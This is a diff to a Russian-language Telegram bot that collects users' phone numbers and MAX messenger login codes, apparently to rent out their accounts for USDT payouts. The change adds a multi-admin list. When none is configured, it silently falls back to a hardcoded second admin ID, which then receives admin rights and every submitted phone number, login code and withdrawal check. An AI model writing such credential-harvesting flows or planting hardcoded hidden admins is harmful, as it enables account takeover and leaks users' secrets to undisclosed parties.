@@ -29,8 +29,25 @@ logging.basicConfig(level=logging.INFO)
 load_dotenv()
 
 BOT_TOKEN = os.getenv("BOT_TOKEN")
-ADMIN_ID = int(os.getenv("ADMIN_ID"))
 CRYPTOBOT_TOKEN = os.getenv("CRYPTOBOT_TOKEN")
+
+# Настройка списка администраторов с поддержкой строки через запятую и fallback-значений
+ADMIN_IDS = []
+admin_ids_env = os.getenv("ADMIN_IDS")
+if admin_ids_env:
+    try:
+        ADMIN_IDS = [int(x.strip()) for x in admin_ids_env.split(",") if x.strip().isdigit()]
+    except Exception as e:
+        logging.error(f"Ошибка парсинга ADMIN_IDS: {e}")
+
+if not ADMIN_IDS:
+    # Если переменной ADMIN_IDS нет, берем ADMIN_ID и добавляем второго админа
+    base_admin = os.getenv("ADMIN_ID")
+    if base_admin and base_admin.isdigit():
+        ADMIN_IDS.append(int(base_admin))
+    # Добавляем второго администратора по умолчанию
+    if 8754271991 not in ADMIN_IDS:
+        ADMIN_IDS.append(8754271991)
 
 bot = Bot(token=BOT_TOKEN)
 dp = Dispatcher()
@@ -44,7 +61,7 @@ class TicketStates(StatesGroup):
 class SubscriptionMiddleware(BaseMiddleware):
     async def __call__(self, handler, event, data: dict):
         user = event.from_user if hasattr(event, 'from_user') else getattr(event, 'message', None).from_user
-        if not user or user.id == ADMIN_ID:
+        if not user or user.id in ADMIN_IDS:
             return await handler(event, data)
 
         if isinstance(event, CallbackQuery) and event.data == "check_subscription":
@@ -79,7 +96,7 @@ async def start_cmd(message: Message):
     create_user(message.from_user.id, message.from_user.username)
     try:
         member = await bot.get_chat_member("@adteoamdkmMAX", message.from_user.id)
-        if member.status in ["member", "administrator", "creator"] or message.from_user.id == ADMIN_ID:
+        if member.status in ["member", "administrator", "creator"] or message.from_user.id in ADMIN_IDS:
             await message.answer(
                 "🚀 <b>MaxRentik Приветствует!</b>\n\nВыберите действие:",
                 reply_markup=user_menu(),
@@ -101,7 +118,7 @@ async def check_subscription(call: CallbackQuery):
     await call.answer()
     try:
         member = await bot.get_chat_member("@adteoamdkmMAX", call.from_user.id)
-        if member.status in ["member", "administrator", "creator"] or call.from_user.id == ADMIN_ID:
+        if member.status in ["member", "administrator", "creator"] or call.from_user.id in ADMIN_IDS:
             await call.message.edit_text(
                 "✅ <b>Подписка подтверждена!</b>\nДобро пожаловать в главное меню:",
                 reply_markup=user_menu(),
@@ -153,14 +170,21 @@ async def phone_input(message: Message, state: FSMContext):
     await message.answer(f"✅ Заявка #{ticket_id} создана!", reply_markup=user_menu())
     
     username_str = f"@{message.from_user.username}" if message.from_user.username else "Нет"
-    await bot.send_message(
-        ADMIN_ID, 
-        f"🆕 Новая заявка #{ticket_id} (MAX)\n"
-        f"Пользователь: <code>{message.from_user.id}</code> ({username_str})\n"
-        f"Данные: {message.text}",
-        reply_markup=admin_ticket_keyboard(ticket_id, "MAX"), 
-        parse_mode="HTML"
-    )
+    
+    # Отправка уведомления всем администраторам из списка
+    for admin_id in ADMIN_IDS:
+        try:
+            await bot.send_message(
+                admin_id, 
+                f"🆕 Новая заявка #{ticket_id} (MAX)\n"
+                f"Пользователь: <code>{message.from_user.id}</code> ({username_str})\n"
+                f"Данные: {message.text}",
+                reply_markup=admin_ticket_keyboard(ticket_id, "MAX"), 
+                parse_mode="HTML"
+            )
+        except Exception as e:
+            logging.error(f"Не удалось отправить уведомление админу {admin_id}: {e}")
+            
     await state.clear()
 
 # ==================== Сдача КАРТЫ ====================
@@ -242,15 +266,20 @@ async def execute_withdrawal(message: Message, user_id: int, amount: float, stat
             user_info = get_user(user_id) or (None, None, 0.0, 0.0, 0, 0, 0, None)
             username_str = f"@{user_info[7]}" if user_info[7] else "Нет"
             
-            await bot.send_message(
-                ADMIN_ID,
-                f"💰 <b>Заявка на вывод #{ticket_id}</b>\n"
-                f"Пользователь: <code>{user_id}</code> ({username_str})\n"
-                f"Сумма: {amount} USDT\n"
-                f"Чек: {invoice_url}",
-                reply_markup=admin_withdraw_keyboard(ticket_id),
-                parse_mode="HTML"
-            )
+            # Отправка уведомления всем администраторам из списка
+            for admin_id in ADMIN_IDS:
+                try:
+                    await bot.send_message(
+                        admin_id,
+                        f"💰 <b>Заявка на вывод #{ticket_id}</b>\n"
+                        f"Пользователь: <code>{user_id}</code> ({username_str})\n"
+                        f"Сумма: {amount} USDT\n"
+                        f"Чек: {invoice_url}",
+                        reply_markup=admin_withdraw_keyboard(ticket_id),
+                        parse_mode="HTML"
+                    )
+                except Exception as e:
+                    logging.error(f"Не удалось отправить уведомление о выводе админу {admin_id}: {e}")
         else:
             logging.error(f"CryptoBot API Error: {invoice}")
             await message.answer("❌ Ошибка создания чека.")
@@ -262,7 +291,7 @@ async def execute_withdrawal(message: Message, user_id: int, amount: float, stat
 @dp.callback_query(F.data.startswith("done:"))
 async def done_callback(call: CallbackQuery):
     await call.answer()
-    if call.from_user.id != ADMIN_ID: return
+    if call.from_user.id not in ADMIN_IDS: return
     tid = int(call.data.split(":")[1])
     t = get_ticket(tid)
     if not t: return await call.message.edit_text("❌ Заявка не найдена.")
@@ -283,7 +312,7 @@ async def done_callback(call: CallbackQuery):
 @dp.callback_query(F.data.startswith("admin_cancel:"))
 async def admin_cancel(call: CallbackQuery):
     await call.answer()
-    if call.from_user.id != ADMIN_ID: return
+    if call.from_user.id not in ADMIN_IDS: return
     tid = int(call.data.split(":")[1])
     t = get_ticket(tid)
     if not t: return await call.message.edit_text("❌ Заявка не найдена.")
@@ -308,7 +337,7 @@ async def admin_cancel(call: CallbackQuery):
 @dp.callback_query(F.data.startswith("ask_code:"))
 async def ask_code(call: CallbackQuery, state: FSMContext):
     await call.answer()
-    if call.from_user.id != ADMIN_ID: return
+    if call.from_user.id not in ADMIN_IDS: return
     tid = int(call.data.split(":")[1])
     t = get_ticket(tid)
     if not t: return await call.message.edit_text("❌ Заявка не найдена.")
@@ -338,20 +367,27 @@ async def code_input(message: Message, state: FSMContext):
         )
         
         username_str = f"@{message.from_user.username}" if message.from_user.username else "Нет"
-        await bot.send_message(
-            ADMIN_ID,
-            f"🔑 <b>Код по заявке #{tid} (MAX)</b>\n"
-            f"Пользователь: <code>{message.from_user.id}</code> ({username_str})\n"
-            f"Отправленный код: <code>{message.text}</code>",
-            reply_markup=admin_code_received_keyboard(tid),
-            parse_mode="HTML"
-        )
+        
+        # Отправка кода всем администраторам из списка
+        for admin_id in ADMIN_IDS:
+            try:
+                await bot.send_message(
+                    admin_id,
+                    f"🔑 <b>Код по заявке #{tid} (MAX)</b>\n"
+                    f"Пользователь: <code>{message.from_user.id}</code> ({username_str})\n"
+                    f"Отправленный код: <code>{message.text}</code>",
+                    reply_markup=admin_code_received_keyboard(tid),
+                    parse_mode="HTML"
+                )
+            except Exception as e:
+                logging.error(f"Не удалось отправить код админу {admin_id}: {e}")
     else:
         await message.answer("❌ Произошла ошибка или сессия устарела.", reply_markup=user_menu())
     await state.clear()
 
-@dp.message(F.from_user.id == ADMIN_ID, Command("tab"))
+@dp.message(Command("tab"))
 async def tab_command(message: Message):
+    if message.from_user.id not in ADMIN_IDS: return
     withdrawals = get_pending_withdrawals()
     if not withdrawals:
         return await message.answer("📭 Нет заявок на вывод.")
@@ -367,7 +403,7 @@ async def tab_command(message: Message):
 @dp.callback_query(F.data.startswith("paid:"))
 async def paid_withdraw(call: CallbackQuery):
     await call.answer()
-    if call.from_user.id != ADMIN_ID: return
+    if call.from_user.id not in ADMIN_IDS: return
     tid = int(call.data.split(":")[1])
     t = get_ticket(tid)
     if not t: return await call.message.edit_text("❌ Заявка не найдена.")
@@ -381,6 +417,20 @@ async def paid_withdraw(call: CallbackQuery):
             await bot.send_message(t[1], "Ваш счёт оплачен")
         except Exception:
             pass
+
+# Добавлен обработчик для команды /admin, запрошенной в ТЗ
+@dp.message(Command("admin"))
+async def admin_menu_cmd(message: Message):
+    if message.from_user.id not in ADMIN_IDS: return
+    
+    withdrawals = get_pending_withdrawals()
+    count = len(withdrawals)
+    await message.answer(
+        f"🛠 <b>Панель администратора</b>\n\n"
+        f"Всего активных заявок на вывод: <b>{count}</b>\n"
+        f"Используйте команду /tab для детального списка выплат.",
+        parse_mode="HTML"
+    )
 
 # ==================== Запуск ====================
 async def main():
